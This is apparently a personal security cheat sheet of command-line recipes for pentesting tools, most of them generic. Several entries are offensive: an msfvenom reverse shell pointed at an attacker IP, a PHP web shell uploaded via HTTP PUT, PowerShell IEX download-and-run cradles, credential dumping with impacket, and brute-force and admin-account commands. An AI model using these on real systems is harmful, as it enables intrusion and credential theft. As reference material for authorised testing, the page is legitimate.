---
title: "Security grimoire"
layout: default
author_profile: true
classes: wide
---

# Security Grimoire

Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre){:target="blank"}'s online grimoire / cheat-sheet for useful commands. Enjoy!


*(Awesome ASCII art like the one below can be found [here](https://asciiart.website/index.php){:target="blank"}.)*




```
                        .-~~~~~~~~~-._       _.-~~~~~~~~~-.
                    __.'              ~.   .~              `.__
                  .'//                  \./                  \\`.
                .'//                     |                     \\`.
              .'// .-~"""""""~~~~-._     |     _,-~~~~"""""""~-. \\`.     
            .'//.-"                 `-.  |  .-'                 "-.\\`.
          .'//______.============-..   \ | /   ..-============.______\\`.
        .'______________________________\|/______________________________`.

```



## ADB
```
# list devices
adb devices
adb devices -l

# launch root shell on emulator
adb shell

# show installed packages
adb shell pm list packages
pm list packages

# return path to app's files
adb shell pm path package_name_here
pm path package_name_here

# start activity
adb shell am start
am start

# start service
adb shell am startservice
am startservice

# send broadcast
adb shell am broadcast
am broadcast

# send keystroke to device
input text_here / key_event_here

# copy file from local machine to device
adb pull /path/to/file/on/device /path/to/file/on/pc

# copy file from device to local machine
adb push /path/to/file/on/pc /path/to/file/on/device

# install apk on device
adb install /path/tp/apk

# uninstall app
adb uninstall app_name_here

# exit persistent shell
exit

# print help
adb help

# explicitely choose device
adb -s emulator_serial_number_here command_here

# print device log
adb logcat
logcat

# print log help
logcat --help
```



## AMASS
```
# subdomain enumeration
/path/to/amass enum -d domain_here > outfile_here

# subdomain enumeration with API keys in config_file
/path/to/amass enum -d domain_here -config /path/to/config_file_here > outfile_here
```



## APKTOOL
```
# decode apk
apktool d /path/to/apk

# build app from smali
apktool b /path/to/appfolder
```



## BASH / SH
```bash

BASH / SH
---------
# add ! at the end of each line in wordlist
for i in $(cat wordlist.txt); do echo $i; echo ${i}\!; done > tmp
mv tmp wordlist.txt

# for loop from x to z, incrementing in steps of y
for i in $(seq x y z); do command_here; done

# while loop
while [ condition ]; do command_here; other_command_here; done

# conditional statements
if [ some_condition ]; then
  command_here
elif[ some_other_condition ]; then
  other_command_here
else
  some_other_command_here
fi

# evaluate some_other_command before some_command and include the result
some_command `some_other_command with_args`
some_command $(some_other_command with_args)

# chain commands - only execute second if first successful
first_command && second_command 

# chain commands - pipe output of first into second
first_command | second_command 
```



## BASH UTILITIES
```bash

# create alias in .bash_profile
alias alias_name_here="command_to_run_here"
source ~/.bash_profile

# link binary (use without full path)
sudo ln -s /path/to/binary /usr/bin/binary_name_here

# read all files in . + grep for search_term
cat *|grep search_term

# read all files in . + grep for search_term (case-insensitive)
cat *|grep -i search_term

# read all files in . + grep out search_term
cat *|grep -v search_term

# disable line wrapping
base64 -w 0 file_here

# base64 encode string
echo -n string_here | base64

# base64 decode string
echo -n b64_string_here | base64 -d

# pack command for transport
echo 'command && -stuff here' | base64

# unpack command to file on target
echo 'base64_here' > /tmp/my_script.sh
echo '2nd_base64_here' >> /tmp/my_script.sh

# output previous return value
echo $?

# list every file with SUID bit set
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -4000 -type f 2>/dev/null

# list files recursively
find . -type f

# print path to file
find . -name file_name_here

# grep recursively for search_term_here
grep -r search_term_here /path/to/search/directory

# find file
locate file_here

# calculate MD5 sum of string
echo -n "my awesome string here" | md5sum

# calculate MD5 sum of file
md5sum file_name_here

# enumerate shares
nmblookup -A IP_here

# delete spaces from string
echo "my string with spaces here" | sed -r 's/( )+//g'

# sort text file in alphabetical order + remove duplicates
sort -u file_name_here

# run program as another user
sudo -u other_user_here program_here

# continously show last lines from text file
tail -f /path/to/

# untar .tar.gz
tar -xvzf tarball_here

# untar .tar.gz to specific location
tar -C /path/to/destination -xvzf tarball_here

# update locate's file name database
updatedb

# number of words in text file
wc -w file_name_here

# number of lines in text file
wc -l file_name_here

# number of charcters in text file
wc -m file_name_here

# number of bytes in text file
wc -c file_name_here

# plaintext hexdump
xxd -p filename_here
```



## CEWL
```
# create a wordlist from URL
cewl -w /path/to/outfile.txt -v URL_here
```



## CHECKSEC
```
# check flags on binary
checksec file_name_here
```



## CMD
```
# clear screen
cls

# enumerate hidden files
dir -ah
dir /ah
attrib

# show path variable
path
echo %PATH%

# run local executable
.\some_executable_here

# show environment variable
echo %variable_name_here%

# show other variables
set

# set other variables
set variable_name=value_here

# chain commands - execute both
first_command & second_command 

# chain commands - only execute second if first successful
first_command && second_command 

# chain commands - pipe output of first into second
first_command | second_command 

# chain commands - if first fails, execute second
first_command || second_command 

# conditional statements
if %some_variable%==some_value (command_here) else (some_other_command_here)

# list files in directory
for %i in (*.*) do @echo FILE: %i

# display output without command prompt
@command_here

# enumerate shares
nbtstat -A IP_here

# find domain name (on box)
wmic computersystem get domain

# find a domain controller (on box)
nltest /dsgetdc:domain_name_here
```



## CRACKMAPEXEC
```
# check for password policy on Windows domain
crackmapexec protocol_here IP_here --pass-pol -u '' -p ''

# brute force login
crackmapexec protocol_here IP_here -u userlist.txt -p passwordlist.txt

# crawl smb shares
crackmapexec smb IP_here -u user -p password -M spider_plus
```



## CURL
```
# basic syntax
curl "protocol_here://url_here"

# send GET request
curl -X GET "https://url_here" -H "header_here: value_here" -H "another_header_here: value_here" -H "header_without_value;"

# send POST request
curl -X POST "https://url_here" -H "header_here: value_here" -d "{\"some_data\":\"value_here\",\"some_more_data\":\"value_here\"}"

# PUT file
curl -T /path/to/local/file https://url_here/path/to/remote/file

# PUT json data
curl -X PUT -H "Content-Type: application/json" -d '{"key":"value","key":"value"}' https://url_here
```



## DEX2JAR
```
# convert apk to jar
d2j-dex2jar /path/to/apk -o outfile.jar
```



## DIG
```
# print public IP
dig +short myip.opendns.com @resolver1.opendns.com
```



## DNSRECON
```
# find hostname
dnsrecon -d domain_here -r range_here
```



## DOCKER
```
# show available containers
docker ps

# run shell in container
docker exec -it container_ID_here /bin/bash
```



## DOS2UNIX / UNIX2DOS
```
# convert text files from DOS to Unix (CR/LF -> LF)
dos2unix filename
dos2unix filename -n new_file

# convert text files from Unix to DOS (LF -> CR/LF)
unix2dos filename
unix2dos filename -n new_file
```



## DRUPAL
```
# droopescan
droopescan scan drupal -u IP_here
```



## ENV
```
# show all environment variables
env

# set environment variable 
export VARIABLE_HERE=value_here

# show value
echo $VARIABLE_HERE
```



## EVIL-WINRM
```
# get shell on IP_here as user
evil-winrm -i IP_here -u user -p password 
```



## FFUF
```
# enumerate files
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.html
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.php 
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.txt

# filter out responses with a certain number of words
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fw number_here

# filter out responses with a certain size
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fs size_here

# filter out responses with a certain status code
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fc code_here

# read raw HTTP request from file
ffuf -w /path/to/wordlist.txt -request file_here

# fuzz with cookies (e.g. authentication)
ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -b "cookie_here=value_here; another_cookie_here=value_here"
```



## FPING
```
# ping sweep
fping -a -g IP_range 2>/dev/null
```



## FTP
```
# connect
ftp IP_here

# file upload
put /path/to/local/file [/path/remote]

# file download
get /path/to/remote/file

# change to binary mode
binary

# rename file
rename old_file_name new_file_name
```



## GOBUSTER
```
# enumerate web folders
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -o root-dir

# skip SSL certificate verfication
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -k
```



## GO / GOLANG
```golang
# print line
import ("fmt")
fmt.Println("Print this line.")
const some_string = "some string here"
var some_other_string = "some other string"
fmt.Println("Printing ", some_string, "and ", some_other_string, ".")
```



## GOOGLE DORKS
```
# URL
inurl:(extension_here|other_extension_here)

# page title
intitle: "keyword_here" "other_keyword_here"

# hostname
site:www.domain.com
site:com

# file type
filetype:extension_here

# logical operators
AND
OR
&
|

# filter out keyword
-keyword_here
```



## GPP-DECRYPT
```
# decrypt password from group policy preferences
gpp-decrypt ciphertext_here
```



## HASHCAT
```
# permute words in wordlist
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# crack hash (with salt : append salt after hash in file : hash_here:salt_here)
hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
```



## HDIUTIL
```
# attach .dmg
hdiutil attach /path/to/dmg
cd /path/to/volume

# detach .dmg
hdiutil detach /path/to/volume
```



## HOST
```
# request name server for domain
host -t ns url_here

# zone transfer
host -l url_here name_server_here
```



## HYDRA
```
# dictionary attack
hydra -L users.txt -P passwords.txt <protocol://IP_here> <options>
hydra -l user_name_here -P /path/to/wordlist <protocol://IP_here> <options>

# dictionary attack - web form
hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/login/form:user_name_param=^USER^&password_param=^PASS^&submit=Login:error_message_upon_failed_login_here"
```



## IMPACKET
```
# get TGT for users with UF_DONT_REQUIRE_PREAUTH
/path/to/impacket/examples/GetNPUsers.py domain/ -usersfile /path/to/users.txt -no-pass -outputfile /path/to/tgt.txt

# dump secrets as user
/path/to/impacket-secretsdump -dc-ip IP_here user:password@IP_here

# kerberoasting : gather NTLM hashes
/path/to/impacket/examples/GetUserSPNs.py -request -dc-ip IP_here domain/user

# gather domain usernames
/path/to/impacket/GetADUsers.py -all -dc-ip IP_here domain/user

# get shell as user
/path/to/impacket/psexec.py domain/user@IP_here
```



## JARSIGNER
```
# sign apk :
# 1. generate private key
keytool -genkey -v -keystore keystore_here -alias alias_here -keyalg RSA -keysize 2048 -validity 7400
# 2. sign
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore_here /path/to/apk alias_here

# verify signature
jarsigner -verify -verbose -certs /path/to/apk
```



## JOHN
```
# crack password hash - dictionary attack
john -w=/path/to/wordlist /path/to/hash

# crack password hash with mangling - dictionary attack
john -w=/path/to/wordlist -rules /path/to/hash

# crack password hash - brute-force attack
john -incremental -users:user_here /path/to/hash

# unshadow
unshadow passwd_file shadow_file > output_file

# show cracked passwords
john --show /path/to/hash

# convert kdbx to john
keepass2john db_here.kdbx
```



## LDAP
```
# nmap script
nmap --script ldap-search IP_here 

ldapsearch -LLL -x -H ldap://IP_here -b '' -s base'(objectclass=*)'

ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'

# get domain name
ldapsearch -x -h IP_here -s base namingcontexts
```



## MONGO
```sql
# connect to mongoDB database
mongo -u user_here -p password_here IP_here:port_here
```



## MSFCONSOLE
```
# import new exploit (Kali)
wget url_to_raw_ruby_exploit
cp ruby_exploit /usr/share/metasploit-framework/modules/exploits/path/to/fitting/category/exploit.rb
# exit msfconsole + restart

# import new exploit (install from git)
wget url_to_raw_ruby_exploit
cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/path/to/fitting/category/exploit.rb
# exit msfconsole + restart
```



## MSFVENOM
```
# list available payloads
msfvenom --list payloads

# create Windows TCP reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
```



## MSSQL
```sql
# connect to a db server as user
mssql -s IP_db_server -o port -u username -p password
```



## MYSQL / MARIADB
```sql
# start service
systemctl start mysql.service

# restart service
systemctl restart mysql.service

# stop service
systemctl stop mysql.service

# launch mysql as default user on kali
mysql -u root -p

# create new database
create database 'db_name';

# list existing databases
show databases;

# enter database
use db_name;

# create new table + define columns
create table 'table_name' (column_name1 VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25), [...]);

# list existing tables of current database
show tables;

# list all data from table
select * from 'table_name';

# create new user@localhost
create user 'username'@'localhost' identified by 'password';

# create new user@IP_here
create user 'username'@'IP_here' identified by 'password';

# create new user@IP_wildcard
create user 'username'@'%' identified by 'password';

# grant privileges to user@IP_here for every database
grant all privileges on *.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for every table in db_name database
grant all privileges on 'db_name'.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for table table_name in db_name database
grant all privileges on 'db_name'.'table_name' to 'username'@'IP_here' identified by 'password';

# show privileges for user
show grants for 'username'@'IP_here';

# apply changes to privileges
flush privileges;

# delete user
drop user 'username'@'IP_here';
```



## NETCAT
```php
#establish connection
nc target_IP port_here
nc -v target_IP port_here

# start listener
nc -lnvp port_here

# banner grabbing (2 empty lines required between headers + body!)
nc target_IP 80 -v
HEAD / HTTP/1.0



# enumerate allowed HTTP verbs
nc target_site 80 -v
OPTIONS / HTTP/1.0



# exploit DELETE
nc target_site 80 -v
DELETE /path/to/resource.txt HTTP/1.0



# exploit PUT with php web shell
nc target_site 80 -v
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

<?php
if (isset ($GET['cmd']))
{
$cmd = $_GET['cmd'];
echo '<pre>';
$result = shell_exec($cmd);
echo $result;
echo '</pre>';
}
?>
```



## NET
```
# add new user
net user user_here password_here /add

# add new user to domain
net user user_here password_here /add /domain

# add user to group 
net group "group_name_here" /add user_here

# make user local admin
net localgroup administrators /add user_here

# display user information
net user user_here /domain

# enumerate shares
net view IP_here

# test for null session on share
net use \\IP_here\IPC$ '' /u:''
```



## NIKTO
```
# scan host / site
nikto -h host_site_here

# scan host / site with authentication
nikto -h host_site_here -i user_here:password_here
```



## NMAP
```
# ping sweep
nmap -sn IP_range
nmap -sn -iL IP_list_file_here

# OS fingerprinting
nmap -Pn -O IP_here

# aggressive OS scan
nmap -Pn -O --osscan-guess IP_here

# gentle OS scan (limit detection to promising hosts)
nmap -Pn -O --osscan-limit IP_range

# TCP connection scan
nmap -sT target_here

# TCP SYN scan
nmap -sS target_here
nmap target_here

# TCP version scan
nmap -sV target_here

# possible target identifiers
nmap -some_scan DNS_here
nmap -some_scan IP_list_here
nmap -some_scan IP_with_wildcard_here
nmap -some_scan IP_range_list_here
nmap -some_scan CIDR_list_here
nmap -some_scan -iL IP_list_file_here

# more info on scan
nmap --reason

# show all available scripts
locate -r '\.nse$'

# show all available scripts with categories
locate -r '\.nse$' | xargs grep categories

# run some_script in debug mode
nmap --script some_script -p port_here IP_here -d

# check supported HTTP methods
nmap -p 443 --script http-methods --script-args http-methods.url-path='/my/path/here' url_here
```



## NSLOOKUP
```
# find hostname of IP_here
nslookup
server DNS_IP_here
127.0.0.1
IP_here
```



## OPENSSL
```
# banner grabbing (2 empty lines required between headers + body!)
openssl s_client -connect target_ip:443
HEAD / HTTP/1.1


```



## PERL
```perl
# generate string of 20 A + concatenate with ABCD
$(perl -e 'print "\x41" x 20 . "ABCD"')
```



## PHP
```php
# interactive mode
php -a

# define http request variables : parameter can be used in subsequent GET + POST requests
<?php system($_REQUEST['parameter_name_here']); ?>
```



## PIP
```python
# install pip package
python3 -m pip install package
```



## POWERSHELL
```powershell
# import module
Import-Module module_name_here

# grep
Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"

# grep recursively
Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"

# search for a file
Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File

# display user privs
whoami /all

# download file from web server
IEX(IWR('http://URL_here/file_here'))
IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')

# read text file
Get-Content file_name-here

# read alternate data stream
Get-Content file_name_here -Stream ads_name_here

# connect to share
New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\share_name_here"

# check process architecture
[Environment]::Is64BitProcess

# check OS architecture
[Environment]::Is64BitOperatingSystem
```



## PYTHON & PYTHON3
```python
# user python path from env
#!/usr/bin/env python
#!/usr/bin/env python3

# HTTP server
python -m SimpleHTTPServer 80
python3 -m http.server 80

# concatenate characters + bytes (BOF)
print(b'char_here' * factor_here + b'\xbyte_here\xanother_byte_here)

# interact with executable - run and attach proces
io = process("/path/to/executable/here")

# interact with executable - attach to remote server
io = remote("server_IP_here", port_here)

# interact with executable - send data
io.sendlineafter("last_char/string_received ","char/string_to_send")

# interact with executable - receive data
io.recvline()
io.recvline().strip()
io.recvline().strip().split()
io.recvline().strip().split()[-1]

# interact with executable - get interactive prompt
io.interactive()

# create cyclic string
from pwn import *
cyclic(length_here)

# find substring in cyclic string
cyclic_find("substring_here")

# read file line per line
with open("file_name_here","mode_here",encoding="encoding_here") as file:
  for line in file:
    do_something
```



## RADARE2
```
# open binary in debug mode
r2 -d /path/to/binary

# analyze all symbols and entry points in binary (after opening in debug mode)
aa

# output help
?
?command_here

# list all functions
afl

# print function disassembly code
pdf @function_name_here

# set breakpoint
db instruction_address_here

# run program until breakpoint
dc

# print variable content
px @variable_address

# execute next instruction
ds

# print content of registers
dr

# reload program
ood
```



## REG QUERY
```
# enumerate registry information, search recursively for password in HKLM
reg query HKLM /f password /t REG_SZ /s

# enumerate registry information, search recursively for password in HKCU
reg query HKCU /f password /t REG_SZ /s
```



## RPC
```
# connect anonymously
rpcclient -U "" IP_here

# connect as user
rpcclient -U username%password IP_here

# nmap script
nmap --script rpc-grind IP_here

# rpcclient - find domain name
querydominfo

# rpcclient - domain look-up
lookupdomain domaine_here

# rpcclient - enumerate domain users
enumdomusers

# rpcclient - display description fields
querydispinfo
```



## RPCBIND
```
# enumerate rpcbind
rpcinfo IP_here

# show export list for NFS server
showmount -e IP_here
```



## SCP
```
# copy remote file to local machine
scp user@IP_here:/path/to/remote/file /path/to/local/file

# copy local file to remote machine
scp /path/to/local/file user@IP_here:/path/to/remote/file

# authenticate with ssh key + copy remote file to local machine
scp -i private_key_here user@IP_here:/path/to/remote/file /path/to/local/file

# authenticate with ssh key + copy local file to remote machine
scp -i private_key_here /path/to/local/file user@IP_here:/path/to/remote/file 
```



## SFTP
```
# connect as user
sftp -oPort=port user@IP_here

# upload file
put /path/to/local/file [/path/remote]

# download file
get /path/to/remote/file
```



## SIPVICIOUS
```
# enumerate SIP servers
svmap IP_range_here

# enumerate valid extensions for SIP endpoints
svwar -m INVITE IP_here
```



## SMB
```
# enumerate shares with anonymous login
smbclient -L smb -I IP_here

# enumerate smb shares as user_here
smbclient -L smb -I IP_here -U user_here

# enumerate smb shares
nmap --script=smb-enum-shares IP_here

# enumerate smb shares
smbmap -H IP_here

# enumerate smb shares as user
smbmap -u user -p password -d domain_here -H IP_here

# recursively list share content + permissions for null session
smbmap -R share_here -H IP_here

# recursively list share content + permissions for user_here
smbmap -R share_here -H IP_here -d domain_here -u user_here -p password_here

# enumerate smb shares
crackmapexec smb IP_here --shares

# enumerate smb shares as user
crackmapexec smb IP_here -u user -p password --shares

# connect to a directory on a share as username
smbclient \\\\IP_here\\some_share -D some_folder -U username%password

# smbclient - upload file
put /path/to/local/file [/path/remote]

# smbclient - download file
get /path/to/remote/file

# smbclient - bulk download every file on share
recurse ON
prompt OFF
mget *

# test for null session
smbclient //IP_here/IPC$ -N

# mount smb share
sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_here /path/to/mountpoint

# create share for file transfer
/path/to/impacket-smbserver share_name_here `password_here`
```



## SQLITE3
```
# display database content
sqlite3 database_here .dump
```



## SQLMAP
```
# launch sqlmap from a GET / POST request file
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3

# set dbms
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3 --dbms=DBMS_here

# list available tampers
python /path/to/sqlmap --list-tampers
```



## SQSH
```
# connect to SQL database
sqsh -S IP_here -U user_here -P password_here

# sqsh - execute command on server
xp_cmdshell 'command_here'
go

# sqsh - turn on componant for xp_cmdshell (needs admin privs)
EXEC SP_CONFIGURED 'show advanced options',1
EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
go
```



## SSH
```
# connect as user with password
ssh user@IP

# connect as user with private key
ssh -i private_key user@IP

# port forwarding
ssh -L port_to_forward_to:IP_here:port_to_forward_from
```



## TCPDUMP
```
# list all interfaces
tcpdump -D

# monitor connections on interface
tcpdump -i interface_here

# monitor specific src and / or dst IP
tcpdump -i interface_here src IP_here and dst IP_here

# monitor specific dst IP and port
tcpdump -i interface_here dst IP_here and port port_here

# listen for ping
tcpdump -i interface_here icmp
tcpdump -i interface_here icmp and icmp[icmptype]=icmp-echo
```



## VIM
```
# jump to line
:line_number_here

# type =/=
!=
```



## WGET
```
# retrieve folders + files from ftp
wget --mirror 'ftp://user_here:password_here@hostname.domain'
wget --mirror 'ftp://user_here:password_here@IP_here'
```



## WINEXE
```
# get shell on IP_here as user with password
winexe -U domain_here/user_here%password_here cmd.exe

# get shell on IP_here as user with lm:ntlm hash
pth-winexe -U domain_here/user_here cmd.exe
```



## 7Z
```
# extract password-protected archive (special characters in password need to be escaped with \)
7z e archive_here.zip -ppassword_here 

```